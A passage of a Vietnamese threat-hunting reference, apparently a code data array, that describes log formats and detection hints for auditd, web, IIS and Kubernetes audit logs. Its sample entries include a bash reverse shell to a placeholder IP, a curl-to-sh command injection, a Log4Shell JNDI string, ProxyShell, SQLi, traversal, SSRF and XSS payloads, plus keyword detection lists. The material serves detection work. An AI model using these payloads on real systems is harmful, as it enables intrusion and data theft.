www-data         pts/1    10.30.1.99       Sat Oct 24 09:30:02 +0700 2026`, "", R`lastlog | grep -v "Never logged in"`],


["lin-acct","utmp (who/w)","Phiên đăng nhập hiện tại","i","",
 "Danh sách phiên đăng nhập đang hoạt động trên hệ thống.", "ut_user: username đang đăng nhập\nut_line: tty/pts\nut_pid: PID của tiến trình login/shell\nut_host: host nguồn nếu đăng nhập từ xa\nut_tv: thời điểm đăng nhập", R`root     pts/0        2026-10-24 09:12   .          1234 (10.30.1.99)
oracle   pts/1        2026-10-24 09:30   00:05      1240 (10.30.1.99)`, "So sánh với auth.log/wtmp; tiến trình cố tình không ghi vào utmp (session ẩn) là kỹ thuật chống điều tra thường gặp.", "who -u"],



/* ===== auditd ===== */
["lin-audit","SYSCALL execve","Thực thi lệnh (execve)","h","T1059.004",
 "Rule: -a always,exit -F arch=b64 -S execve -k exec. Một sự kiện gồm SYSCALL + EXECVE (tham số) + CWD + PATH + PROCTITLE.",
 R`auid: user đăng nhập gốc
uid/euid: user hiệu lực
comm, exe: tiến trình
EXECVE a0..aN: từng tham số
key: nhãn rule`,
 R`type=SYSCALL msg=audit(1729735950.123:4471): arch=c000003e syscall=59 success=yes exit=0 ppid=2231 pid=22501 auid=4294967295 uid=33 gid=33 euid=33 comm="bash" exe="/usr/bin/bash" key="exec"
type=EXECVE msg=audit(1729735950.123:4471): argc=3 a0="bash" a1="-c" a2="bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"
type=CWD msg=audit(1729735950.123:4471): cwd="/var/www/html/uploads"
type=PROCTITLE msg=audit(1729735950.123:4471): proctitle=62617368002D63...`,
 "uid=33 (www-data) hoặc user dịch vụ chạy bash/sh/python/nc; /dev/tcp trong tham số; cwd là thư mục upload. auid=4294967295 + uid dịch vụ = lệnh sinh từ daemon, không phải người đăng nhập.", R`ausearch -k exec -ui 33 -i --start today`],


["lin-audit","USER_LOGIN / USER_AUTH","Đăng nhập / xác thực","m","T1078, T1110",
 "Ghi bởi PAM qua sshd, login, sudo.", "res=success / res=failed", R`type=USER_LOGIN msg=audit(1729735901.551:4402): pid=21544 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct="root" exe="/usr/sbin/sshd" hostname=? addr=10.30.1.99 terminal=ssh res=failed'`, "", R`aureport -au --failed -i | tail -30`],


["lin-audit","USER_CMD","Lệnh sudo","m","T1548.003",
 "cmd được mã hóa hex; dùng ausearch -i để giải mã.","auid: UID đăng nhập gốc (audit UID), không đổi dù qua sudo/su, dùng truy nguồn người thật\nuid: UID hiệu lực hiện tại của tiến trình gọi sudo\ncwd: thư mục làm việc khi chạy sudo\ncmd: lệnh được chạy, mã hex (dùng ausearch -i để giải mã)\nexe: đường dẫn binary thực thi (/usr/bin/sudo)\nres: kết quả thực thi (success/failed)", R`type=USER_CMD msg=audit(1729736110.020:4520): pid=22030 uid=1001 auid=1001 ses=7 msg='cwd="/home/thanhnv" cmd=2F62696E2F62617368 exe="/usr/bin/sudo" terminal=pts/0 res=success'`, "cmd=2F62696E2F62617368 giải mã là /bin/bash.", R`ausearch -m USER_CMD -i --start today`],


["lin-audit","ADD_USER / ADD_GROUP","Tạo user / nhóm","h","T1136.001",
 "Ghi bởi useradd/groupadd.","auid: UID đăng nhập gốc của người thực hiện tạo tài khoản\nuid: UID hiệu lực của tiến trình (thường 0 vì cần quyền root)\nop: loại thao tác (adding user)\nid: UID được cấp cho tài khoản mới tạo\nexe: binary thực hiện thao tác (/usr/sbin/useradd)\nres: kết quả thao tác (success/failed)", R`type=ADD_USER msg=audit(1729736411.300:4602): pid=22301 uid=0 auid=1001 ses=7 msg='op=adding user id=1002 exe="/usr/sbin/useradd" hostname=app01 addr=? terminal=pts/0 res=success'`, "", R`ausearch -m ADD_USER,DEL_USER,ADD_GROUP,USER_MGMT -i`],


["lin-audit","USER_CHAUTHTOK","Đổi mật khẩu / token xác thực","m","T1098",
 "passwd, chpasswd.","auid: UID đăng nhập gốc của người thực hiện đổi mật khẩu\nop: loại thao tác PAM (PAM:chauthtok = đổi authentication token)\ngrantors: module PAM đã cấp phép thao tác (pam_unix)\nacct: tài khoản bị đổi mật khẩu\nexe: binary thực hiện (/usr/bin/passwd)\nres: kết quả (success/failed)", R`type=USER_CHAUTHTOK msg=audit(1729736462.110:4610): pid=22410 uid=0 auid=1001 ses=7 msg='op=PAM:chauthtok grantors=pam_unix acct="root" exe="/usr/bin/passwd" res=success'`, "", ""],


["lin-audit","watch /etc/passwd","Giám sát file nhạy cảm (-w ... -p wa)","h","T1098, T1003.008",
 "Rule: -w /etc/passwd -p wa -k identity; -w /etc/shadow -p wa -k identity; -w /etc/sudoers -p wa -k priv; -w /root/.ssh -p wa -k rootkey.","key: nhãn rule audit (identity/priv/rootkey) giúp lọc nhanh loại file đang bị giám sát\nsyscall: số hiệu syscall thao tác lên file (vd 257=openat)\nauid: UID đăng nhập gốc của người thực hiện\ncomm: tên tiến trình đang chạy (vi/vim)\nexe: đường dẫn binary thực thi tương ứng\nname (trong PATH record): đường dẫn file bị truy cập, khớp với rule -w", R`type=SYSCALL msg=audit(1729736500.410:4630): arch=c000003e syscall=257 success=yes exit=3 auid=1001 uid=0 comm="vi" exe="/usr/bin/vim" key="identity"
type=PATH msg=audit(1729736500.410:4630): item=0 name="/etc/shadow" inode=1057 nametype=NORMAL`, "Đọc /etc/shadow bởi tiến trình không phải passwd/sshd/login; ghi vào /root/.ssh/authorized_keys.", R`ausearch -k identity -k rootkey -i --start today`],


["lin-audit","CONFIG_CHANGE / DAEMON_END","Thay đổi rule audit / auditd dừng","c","T1562.012",
 "auditctl -D, xóa rule, hoặc dừng auditd.","op=remove_rule: thao tác xóa một rule audit (auditctl -D hoặc xóa rule cụ thể)\nkey: nhãn của rule bị xóa\nlist: số hiệu danh sách filter rule audit bị tác động\nres: kết quả thao tác (res=1 nghĩa là thành công trong CONFIG_CHANGE)\nop=terminate (DAEMON_END): auditd nhận lệnh dừng và kết thúc tiến trình\nauid: UID đăng nhập gốc của người thực hiện thay đổi/dừng", R`type=CONFIG_CHANGE msg=audit(1729736600.001:4700): auid=1001 ses=7 op=remove_rule key="exec" list=4 res=1
type=DAEMON_END msg=audit(1729736605.000:4701): op=terminate auid=0 pid=1 res=success`, "Đặt -e 2 cuối file rule để khóa cấu hình (chỉ đổi được sau reboot).", ""],


["lin-audit","AVC","SELinux từ chối","m","T1505.003",
 "SELinux chặn hành vi vượt policy.","denied { <perm> }: hành động bị SELinux chặn (vd execute)\npid / comm: PID và tên tiến trình bị chặn\nname: tên đối tượng (file/tiến trình) bị truy cập\nscontext: ngữ cảnh SELinux (nhãn) của tiến trình nguồn\ntcontext: ngữ cảnh SELinux của đối tượng đích\ntclass / permissive: loại đối tượng (file, process...) và chế độ SELinux (0=enforcing, chặn thật; 1=permissive, chỉ log)", R`type=AVC msg=audit(1729736700.120:4750): avc:  denied  { execute } for  pid=22801 comm="httpd" name="sh" dev="dm-0" ino=8392 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:shell_exec_t:s0 tclass=file permissive=0`, "httpd_t/tomcat_t cố exec shell: dấu hiệu webshell hoặc RCE bị chặn.", R`ausearch -m AVC -i --start today`],


["lin-audit","init_module","Nạp kernel module","h","T1547.006",
 "Rule: -a always,exit -F arch=b64 -S init_module,finit_module,delete_module -k modules.","syscall: syscall nạp module kernel (init_module/finit_module, số 175)\ncomm: tên tiến trình gọi lệnh (insmod)\nexe: binary thực thi tương ứng (/usr/bin/kmod)\nkey: nhãn rule audit (modules)\nauid / uid: UID đăng nhập gốc và UID hiệu lực thực hiện thao tác\nsuccess: kết quả syscall (yes/no)", R`type=SYSCALL msg=audit(1729736800.300:4800): arch=c000003e syscall=175 success=yes auid=1001 uid=0 comm="insmod" exe="/usr/bin/kmod" key="modules"`, "", ""],


["lin-audit","SOCKADDR connect","Kết nối mạng ra ngoài","m","T1071",
 "Rule: -a always,exit -F arch=b64 -S connect -F a2!=110 -k netconn (ồn, nên giới hạn theo uid).","syscall: syscall kết nối mạng ra ngoài (connect, số 42)\nsuccess / exit: kết quả syscall và mã lỗi trả về nếu thất bại\nuid: UID hiệu lực của tiến trình thực hiện kết nối\ncomm / exe: tên tiến trình và đường dẫn binary gọi connect\nkey: nhãn rule audit (netconn)\nsaddr: cấu trúc sockaddr dạng hex, chứa họ địa chỉ, cổng và IP đích (giải mã bằng ausearch -i)", R`type=SYSCALL msg=audit(1729735950.140:4472): syscall=42 success=no exit=-115 uid=33 comm="bash" exe="/usr/bin/bash" key="netconn"
type=SOCKADDR msg=audit(1729735950.140:4472): saddr=0200115CCB0071070000000000000000`, "ausearch -i giải mã saddr thành host và port (vd. inet host:203.0.113.7 serv:4444).", R`ausearch -k netconn -i | grep -A2 "comm=bash"`],


["lin-audit","ptrace","ptrace vào tiến trình khác","h","T1055.008",
 "Rule: -a always,exit -F arch=b64 -S ptrace -k ptrace. Dùng để inject hoặc đọc bộ nhớ (credential).","syscall: syscall ptrace (số 101) dùng để theo dõi/can thiệp tiến trình khác\na0: tham số đầu tiên của ptrace, là mã lệnh yêu cầu (PTRACE_ATTACH, PTRACE_PEEKTEXT...)\ncomm / exe: tên tiến trình và binary gọi ptrace\nkey: nhãn rule audit (ptrace)\nauid / uid: UID đăng nhập gốc và UID hiệu lực thực hiện", R`type=SYSCALL msg=audit(1729736900.500:4850): syscall=101 success=yes a0=10 auid=1001 uid=0 comm="gdb" exe="/usr/bin/gdb" key="ptrace"`, "", ""],


["lin-audit","ANOM_PROMISCUOUS","Card mạng vào promiscuous","m","T1040",
 "Tương đương log kernel nhưng có auid.","dev: tên card mạng chuyển chế độ promiscuous\nprom: trạng thái promiscuous mới (256=bật, 0=tắt)\nold_prom: trạng thái promiscuous trước đó\nauid: UID đăng nhập gốc của ngữ cảnh gây ra thay đổi\nuid / gid: UID/GID hiệu lực tại thời điểm xảy ra\nses: session ID liên quan (nếu có)", R`type=ANOM_PROMISCUOUS msg=audit(1729736950.010:4870): dev=eth0 prom=256 old_prom=0 auid=1001 uid=0 gid=0 ses=7`, "", ""],



/* ===== Web access ===== */
["web-acc","combined","Cấu trúc dòng log combined","i","",
 "Đọc từ trái sang: IP client, ident, user, thời gian, request line, status, bytes, Referer, User-Agent.", R`$remote_addr: IP client (sau LB thì cần X-Forwarded-For)
$request: method + URI + protocol
$status: mã phản hồi
$body_bytes_sent: kích thước phản hồi, hữu ích để phát hiện rò dữ liệu`,
 R`10.20.5.23 - - [24/Oct/2026:09:12:44 +0700] "GET /api/v1/accounts?page=2 HTTP/1.1" 200 5123 "https://portal.corp.local/accounts" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0"`, "", ""],


["web-acc","status codes","Mã trạng thái cần chú ý khi săn","i","",
 "Ý nghĩa nhanh khi phân tích hành vi.", R`401/403 tăng đột biến: brute force hoặc dò quyền
404 hàng loạt từ một IP: quét thư mục
405: thử method không hợp lệ (PUT, DELETE, TRACE)
499 (nginx): client đóng trước khi nhận phản hồi, thường thấy với time-based SQLi hoặc scanner
500: lỗi xử lý, thường do payload injection gây lỗi
502/504: backend chết hoặc quá tải
200 với bytes lớn bất thường: lộ dữ liệu`, "", "", ""],


["web-acc","actuator / heapdump","Truy cập endpoint quản trị nhạy cảm","h","T1190, T1552",
 "Spring Boot Actuator và các file cấu hình bị lộ qua web.","%h: IP nguồn gửi request (10.30.1.99)\n\"%r\": dòng request - GET /actuator/heapdump, /actuator/env - các endpoint quản trị Spring Boot Actuator bị lộ ra ngoài\n%>s: mã trạng thái HTTP (200 = truy cập thành công, endpoint không được bảo vệ xác thực)\n%b: số byte phản hồi (104857600 ~ 100MB cho heapdump - dấu hiệu dump toàn bộ heap của ứng dụng)\nUser-Agent: \"python-requests/2.31.0\" - công cụ gọi HTTP bằng script, không phải trình duyệt", R`10.30.1.99 - - [24/Oct/2026:09:12:44 +0700] "GET /actuator/heapdump HTTP/1.1" 200 104857600 "-" "python-requests/2.31.0"
10.30.1.99 - - [24/Oct/2026:09:12:40 +0700] "GET /actuator/env HTTP/1.1" 200 8812 "-" "python-requests/2.31.0"`, "Status 200 + bytes lớn trên /actuator/heapdump, /actuator/env, /actuator/configprops, /.git/config, /.env, /server-status, /phpinfo.php, /WEB-INF/web.xml.", R`grep -E "/actuator/|/\.git/|/\.env|server-status|phpinfo" access.log | awk '$9==200'`],


["web-acc","Tomcat/Java","Access log Tomcat / Java app","i","",
 "Mặc định pattern common (không có UA). Nên đổi sang combined và thêm %D (thời gian ms).","%h: 10.20.5.23 - IP nguồn request\n%t: [24/Oct/2026:09:12:44 +0700] - thời điểm nhận request\n\"%r\": \"POST /ttnt-iam/login HTTP/1.1\" - method và đường dẫn login của ứng dụng Java\n%s: 302 - mã trạng thái (redirect sau xử lý đăng nhập)\n%b: \"-\" - không có nội dung phản hồi\ntrường cuối (41): thời gian xử lý request, tính bằng mili-giây (kiểu %D/%T tùy cấu hình); pattern \"common\" mặc định KHÔNG có User-Agent nên khó nhận diện công cụ tấn công", R`10.20.5.23 - - [24/Oct/2026:09:12:44 +0700] "POST /ttnt-iam/login HTTP/1.1" 302 - 41`, "", ""],



/* ===== IIS ===== */
["web-iis","W3C fields","Cấu trúc log IIS","i","",
 "Thứ tự cột theo dòng #Fields: trong file.", R`sc-status / sc-substatus: mã và mã con
sc-win32-status: lỗi Windows (vd. 64 client ngắt)
time-taken: thời gian xử lý (ms)
cs-username: user nếu có xác thực Windows/Basic`,
 R`#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2026-10-24 02:12:44 10.10.1.20 GET /owa/auth/logon.aspx - 443 - 10.30.1.99 Mozilla/5.0 - 200 0 0 15`, "", ""],


["web-iis","401.x / 403.x","Mã con hay gặp của IIS","i","",
 "", R`401.1: đăng nhập thất bại (sai credential)
401.2: thất bại do cấu hình xác thực server
401.3: bị chặn bởi ACL trên tài nguyên
403.14: directory listing bị từ chối
404.0: không tìm thấy
500.19: lỗi cấu hình web.config`, "", "Nhiều 401.1 trên /EWS, /Autodiscover, /owa: spray mật khẩu Exchange.", ""],


["web-iis","ProxyShell","Mẫu khai thác ProxyShell trên Exchange","c","T1190",
 "URI autodiscover.json chứa @ và đường dẫn backend.","cs-method: GET\ncs-uri-stem: /autodiscover/autodiscover.json - endpoint Exchange Autodiscover bị khai thác\ncs-uri-query: chứa ký tự @ trỏ sang đường dẫn backend /mapi/nspi/ (@evil.com/...) - dấu hiệu đặc trưng của ProxyShell (SSRF qua Autodiscover)\nc-ip: 203.0.113.7 - IP client thực hiện request (khác s-ip server)\ncs(User-Agent): python-requests/2.31.0 - công cụ khai thác tự động\nsc-status: 200 - request được xử lý thành công, time-taken: 31 (ms)", R`2026-10-24 02:30:11 10.10.1.20 GET /autodiscover/autodiscover.json @evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com 443 - 203.0.113.7 python-requests/2.31.0 - 200 0 0 31`, "cs-uri-stem /autodiscover/autodiscover.json kèm Email= hoặc @ trong query; theo sau là truy cập file .aspx mới trong thư mục aspnet_client hoặc owa/auth.", ""],


["web-iis","aspx webshell","POST tới file .aspx lạ","h","T1505.003",
 "Webshell thường nằm trong thư mục ít dùng và chỉ một IP truy cập.","cs-method: POST\ncs-uri-stem: /aspnet_client/system_web/err.aspx - file .aspx lạ nằm trong thư mục hệ thống ít khi chứa nội dung tùy biến\ncs-uri-query: \"-\" - không có tham số truy vấn\nc-ip: 203.0.113.7 - chỉ một IP duy nhất truy cập file này\ncs(User-Agent): \"-\" - trống, bất thường với truy cập ứng dụng web thông thường\nsc-status: 200 - truy cập/thực thi thành công", R`2026-10-24 02:31:40 10.10.1.20 POST /aspnet_client/system_web/err.aspx - 443 - 203.0.113.7 - - 200 0 0 102`, "File .aspx chỉ một IP gọi, không có Referer, chủ yếu POST; tiến trình w3wp.exe sinh cmd/powershell trên cùng thời điểm.", ""],



/* ===== Attack patterns ===== */
["web-atk","SQLi","SQL injection","h","T1190",
 "Payload trong query string; thường kèm status 500 hoặc thời gian phản hồi dài.","\"%r\": \"GET /search?q=1' UNION SELECT username,password FROM users-- -\" - payload SQL injection nằm trong tham số q của query string\n%>s: 500 - lỗi server, thường do câu truy vấn SQL bị lỗi cú pháp vì payload chèn vào\n%b: 312 - kích thước trang lỗi trả về\nUser-Agent: \"sqlmap/1.8#stable\" - công cụ khai thác SQLi tự động, dấu hiệu rõ ràng của tấn công", R`10.30.1.99 - - [24/Oct/2026:09:20:01 +0700] "GET /search?q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--%20- HTTP/1.1" 500 312 "-" "sqlmap/1.8#stable (https://sqlmap.org)"`, "UNION SELECT, ' OR 1=1, SLEEP(, WAITFOR DELAY, information_schema, xp_cmdshell, CHAR(; status 500 tăng đột biến; UA sqlmap. Đối chiếu lỗi DB phía backend để biết payload có thực thi.", ""],


["web-atk","Path traversal / LFI","Đọc file qua path traversal","h","T1190, T1005",
 "Tham số file/path chứa ../ hoặc dạng encode.","\"%r\": \"GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd\" - tham số file chứa chuỗi ../ (URL-encoded) để thoát khỏi thư mục gốc (path traversal)\n%>s: 200 - đọc file thành công, không bị chặn\n%b: 1843 - kích thước nội dung file đọc được (ví dụ /etc/passwd)\nUser-Agent: curl/8.4.0 - công cụ dòng lệnh thường dùng để khai thác thủ công", R`10.30.1.99 - - [24/Oct/2026:09:21:15 +0700] "GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1843 "-" "curl/8.4.0"`, "../, %2e%2e%2f, ..%5c, /etc/passwd, win.ini, WEB-INF/web.xml; status 200 với kích thước khớp file hệ thống.", ""],


["web-atk","Log4Shell / JNDI","Chèn chuỗi JNDI (Log4Shell)","c","T1190",
 "Payload có thể nằm ở URI, User-Agent, header bất kỳ được log.","\"%r\": \"GET / HTTP/1.1\" - URI yêu cầu trông bình thường, không mang payload\nUser-Agent: \"${jndi:ldap://203.0.113.7:1389/Exploit}\" - chuỗi JNDI (Log4Shell) được đặt trong header User-Agent để log4j xử lý và kết nối ra ngoài\n%>s: 200 - server trả lời bình thường dù payload đã được xử lý/log lại\nLưu ý: payload JNDI có thể xuất hiện ở bất kỳ header hoặc tham số nào được ghi log, không chỉ User-Agent", "10.30.1.99 - - [24/Oct/2026:09:22:30 +0700] \"GET / HTTP/1.1\" 200 612 \"-\" \"${jndi:ldap://203.0.113.7:1389/Exploit}\"", "jndi:, ${lower:, ${::-j}; sau đó kiểm tra kết nối LDAP/RMI ra ngoài từ server ứng dụng.", ""],


["web-atk","Command injection","Chèn lệnh hệ điều hành","h","T1190, T1059",
 "Ký tự nối lệnh trong tham số.","\"%r\": \"GET /ping?host=127.0.0.1%3Bcurl%20203.0.113.7%2Fa.sh%7Csh\" - tham số host chứa ký tự nối lệnh ; và pipe | (đã URL-encode) để chèn thêm lệnh hệ điều hành (tải và chạy a.sh)\n%>s: 200 - lệnh được thực thi và trả kết quả\n%b: 88 - kích thước output lệnh\nUser-Agent: curl/8.4.0", R`10.30.1.99 - - [24/Oct/2026:09:23:10 +0700] "GET /ping?host=127.0.0.1%3Bcurl%20203.0.113.7%2Fa.sh%7Csh HTTP/1.1" 200 88 "-" "curl/8.4.0"`, ";, |, &&, $(, backtick, %0a kết hợp curl, wget, id, whoami, nc.", ""],


["web-atk","Webshell","Truy cập webshell","h","T1505.003",
 "File mới trong thư mục upload/static, gọi bằng POST từ một nguồn.","%h: cùng một IP cho cả hai request\n\"%r\": \"POST /uploads/avatar/a1.jsp\" - file .jsp lạ nằm trong thư mục upload/static vốn chỉ nên chứa file tĩnh\n%>s: 200 cho cả hai lần gọi\n%b: 74 rồi 1290 - kích thước phản hồi lần gọi thứ hai lớn hơn nhiều, gợi ý webshell đã thực thi lệnh và trả kết quả\nUser-Agent: Mozilla/5.0 - giả trình duyệt thông thường để né phát hiện", R`10.30.1.99 - - [24/Oct/2026:09:30:02 +0700] "POST /uploads/avatar/a1.jsp HTTP/1.1" 200 74 "-" "Mozilla/5.0"
10.30.1.99 - - [24/Oct/2026:09:30:09 +0700] "POST /uploads/avatar/a1.jsp HTTP/1.1" 200 1290 "-" "Mozilla/5.0"`, "File thực thi (.jsp, .php, .aspx) trong thư mục upload; không có Referer; ít IP gọi; kích thước phản hồi dao động theo lệnh.", ""],


["web-atk","Scanner","Quét thư mục / lỗ hổng","m","T1595.002",
 "Nhiều 404 trong thời gian ngắn từ một IP.","%h: cùng một IP lặp lại liên tục trong thời gian ngắn\n\"%r\": \"GET /wp-login.php\", \"GET /.git/HEAD\", ... - dò hàng loạt đường dẫn/file nhạy cảm không tồn tại trên server\n%>s: 404 lặp lại cho hầu hết request\nUser-Agent: \"Nuclei\" - công cụ scan lỗ hổng tự động, fingerprint rõ ràng của scanner", R`10.30.1.99 - - [24/Oct/2026:09:05:01 +0700] "GET /wp-login.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))"
10.30.1.99 - - [24/Oct/2026:09:05:01 +0700] "GET /.git/HEAD HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nuclei ...)"`, "UA: Nuclei, Nikto, sqlmap, gobuster, ffuf, dirbuster, zgrab, masscan; dù UA bị giả, tỷ lệ 404 cao và tốc độ request vẫn lộ.", R`awk '$9==404 {print $1}' access.log | sort | uniq -c | sort -rn | head`],


["web-atk","Login brute force","Brute force form đăng nhập","h","T1110",
 "POST lặp lại vào endpoint đăng nhập.","%h: cùng một IP cho các lần thử\n\"%r\": \"POST /login\" lặp lại nhiều lần trong thời gian ngắn vào cùng một endpoint đăng nhập\n%>s: 401 (sai thông tin) nhiều lần rồi 302 (đăng nhập thành công) - chuỗi dò mật khẩu\nUser-Agent: python-requests/2.31.0 - client script tự động, không phải người dùng thật", R`10.30.1.99 - - [24/Oct/2026:09:40:01 +0700] "POST /login HTTP/1.1" 401 52 "-" "python-requests/2.31.0"
10.30.1.99 - - [24/Oct/2026:09:40:44 +0700] "POST /login HTTP/1.1" 302 0 "-" "python-requests/2.31.0"`, "Chuỗi 401 kết thúc bằng 302/200 từ cùng IP: có thể đã đúng mật khẩu. Đối chiếu log ứng dụng để biết user nào.", ""],


["web-atk","SSRF","Server-side request forgery","h","T1190, T1552.005",
 "Tham số URL trỏ vào địa chỉ nội bộ hoặc metadata cloud.","\"%r\": \"GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\" - tham số url trỏ tới địa chỉ metadata nội bộ của cloud provider (169.254.169.254) thay vì domain hợp lệ\n%>s: 200 - server backend đã thay mặt kẻ tấn công gửi request nội bộ và trả về kết quả\n%b: 412 - kích thước phản hồi, có thể chứa thông tin nhạy cảm (IAM credentials)\nUser-Agent: curl/8.4.0", R`10.30.1.99 - - [24/Oct/2026:09:45:12 +0700] "GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1" 200 412 "-" "curl/8.4.0"`, "169.254.169.254, metadata.google.internal, localhost, 127.0.0.1, dải 10.x/172.16.x/192.168.x, file://, gopher://.", ""],


["web-atk","XSS","Cross-site scripting","m","T1190",
 "Thẻ script hoặc event handler trong tham số.","\"%r\": \"GET /search?q=<script>alert(document.cookie)</script>\" - tham số q chứa thẻ <script> (URL-encoded) được phản chiếu lại trong trang kết quả (reflected XSS)\n%>s: 200 - server phản hồi bình thường, không lọc/escape payload\n%b: 2210 - kích thước trang trả về có chứa payload\nUser-Agent: Mozilla/5.0 - truy cập từ trình duyệt thật", R`10.30.1.99 - - [24/Oct/2026:09:50:00 +0700] "GET /search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1" 200 2210 "-" "Mozilla/5.0"`, "<script, onerror=, javascript:, %3Csvg.", ""],



/* ===== K8s audit ===== */
["k8s-audit","event structure","Cấu trúc một audit event","i","",
 "Mỗi dòng là một JSON. Các trường cốt lõi để trả lời ai làm gì, ở đâu, kết quả ra sao.",
 R`user.username / user.groups: danh tính (system:serviceaccount:<ns>:<sa> là SA)
verb: get, list, watch, create, update, patch, delete
objectRef.resource / subresource / namespace / name
sourceIPs, userAgent
responseStatus.code: 200/201 thành công, 403 bị RBAC chặn
annotations authorization.k8s.io/decision: allow / forbid`,
 R`{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"7e0c2a4e-...","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/payment/pods","verb":"list","user":{"username":"thanhnv","groups":["system:authenticated"]},"sourceIPs":["10.20.5.23"],"userAgent":"kubectl/v1.29.3","objectRef":{"resource":"pods","namespace":"payment","apiVersion":"v1"},"responseStatus":{"code":200},"requestReceivedTimestamp":"2026-10-24T02:10:11.120Z","stageTimestamp":"2026-10-24T02:10:11.140Z","annotations":{"authorization.k8s.io/decision":"allow"}}`, "", ""],


["k8s-audit","pods/exec","Exec vào container","h","T1609",
 "verb=create (hoặc get với client cũ), resource=pods, subresource=exec.","verb: hành động API — \"create\" nghĩa là mở một stream mới (lệnh exec)\nuser.username: tài khoản (user hoặc ServiceAccount) thực hiện exec\nsourceIPs: địa chỉ IP nguồn gửi yêu cầu\nrequestURI: đường dẫn API đầy đủ, chứa command/container/stdin/tty được chạy\nobjectRef.resource/subresource: resource=\"pods\", subresource=\"exec\" xác nhận đây là lệnh exec vào pod (kèm namespace/name pod)\nresponseStatus.code: mã phản hồi; 101 (Switching Protocols) nghĩa là phiên exec tương tác đã được mở", R`{"verb":"create","user":{"username":"system:serviceaccount:ci:deployer"},"sourceIPs":["10.128.4.17"],"requestURI":"/api/v1/namespaces/payment/pods/api-7d9f/exec?command=sh&container=api&stdin=true&tty=true","objectRef":{"resource":"pods","subresource":"exec","namespace":"payment","name":"api-7d9f"},"responseStatus":{"code":101}}`, "Exec vào namespace production; SA của CI/CD exec interactive (stdin=true&tty=true); command=sh/bash.", R`jq -c 'select(.objectRef.subresource=="exec") | [.requestReceivedTimestamp,.user.username,.objectRef.namespace,.objectRef.name,.requestURI]' audit.log`],


["k8s-audit","secrets get/list","Đọc Secret","h","T1552.007",
 "Cần phân biệt controller hợp lệ với người/SA đọc secret hàng loạt.","verb: hành động — \"list\" (hoặc \"get\") đọc secret\nuser.username: tài khoản/ServiceAccount thực hiện đọc\nsourceIPs: IP nguồn gửi request\nuserAgent: client gọi API; giá trị lạ như curl/... thay vì client K8s chuẩn là dấu hiệu đáng ngờ\nobjectRef.resource/namespace: resource=\"secrets\", namespace nơi secret bị đọc (không có name tức đọc toàn bộ danh sách)\nresponseStatus.code: 200 — đọc thành công", R`{"verb":"list","user":{"username":"system:serviceaccount:payment:default"},"sourceIPs":["10.128.4.22"],"userAgent":"curl/8.4.0","objectRef":{"resource":"secrets","namespace":"payment"},"responseStatus":{"code":200}}`, "SA default hoặc SA ứng dụng list secrets; userAgent là curl/python (token bị đánh cắp từ pod); list secrets toàn cluster.", R`jq -c 'select(.objectRef.resource=="secrets" and (.verb=="list" or .verb=="get")) | [.user.username,.userAgent,.objectRef.namespace,.responseStatus.code]' audit.log | sort | uniq -c | sort -rn | head`],


["k8s-audit","clusterrolebinding","Tạo/sửa ClusterRoleBinding","c","T1098.006",
 "Leo thang quyền bằng cách gắn cluster-admin.","verb: \"create\" — tạo mới binding\nuser.username: người dùng thực hiện hành động\nobjectRef.resource/apiGroup/name: resource=\"clusterrolebindings\", apiGroup=\"rbac.authorization.k8s.io\", tên binding mới\nrequestObject.roleRef: ClusterRole được tham chiếu; \"cluster-admin\" là quyền cao nhất trong cluster\nrequestObject.subjects: đối tượng (ServiceAccount/user/group) được gán quyền qua binding này\nresponseStatus.code: 201 — tạo thành công", R`{"verb":"create","user":{"username":"thanhnv"},"objectRef":{"resource":"clusterrolebindings","apiGroup":"rbac.authorization.k8s.io","name":"tmp-admin"},"requestObject":{"roleRef":{"kind":"ClusterRole","name":"cluster-admin"},"subjects":[{"kind":"ServiceAccount","name":"default","namespace":"payment"}]},"responseStatus":{"code":201}}`, "roleRef cluster-admin hoặc role có verbs ['*']; subject là SA default hoặc group system:authenticated/system:anonymous.", ""],


["k8s-audit","privileged pod","Tạo pod đặc quyền","h","T1610, T1611",
 "Cần audit level Request trở lên để thấy requestObject.", R`securityContext.privileged=true
hostPID / hostNetwork / hostIPC=true
volumes.hostPath.path=/ hoặc /var/run/docker.sock`, R`{"verb":"create","user":{"username":"thanhnv"},"objectRef":{"resource":"pods","namespace":"default"},"requestObject":{"spec":{"hostPID":true,"containers":[{"name":"x","image":"alpine","securityContext":{"privileged":true},"volumeMounts":[{"name":"host","mountPath":"/host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}},"responseStatus":{"code":201}}`, "Pod privileged + hostPath / là đường thoát container lên node.", ""],


["k8s-audit","system:anonymous","Truy cập ẩn danh","h","T1133",
 "Request không xác thực (khi --anonymous-auth=true).","verb: hành động được gọi (vd \"list\")\nuser.username: \"system:anonymous\" — định danh đặc biệt cho request không xác thực\nuser.groups: \"system:unauthenticated\" — nhóm mặc định gán cho mọi request ẩn danh\nsourceIPs: IP nguồn gửi request\nrequestURI: endpoint bị truy cập ẩn danh\nresponseStatus.code: mã phản hồi (403 nếu RBAC từ chối; có thể thành công nếu anonymous có quyền — cần kiểm tra cấu hình --anonymous-auth)", R`{"verb":"list","user":{"username":"system:anonymous","groups":["system:unauthenticated"]},"sourceIPs":["203.0.113.7"],"requestURI":"/api/v1/namespaces/kube-system/secrets","responseStatus":{"code":403}}`, "Mọi request anonymous có code 200 ngoài /healthz, /version, /readyz cần điều tra ngay.", ""],


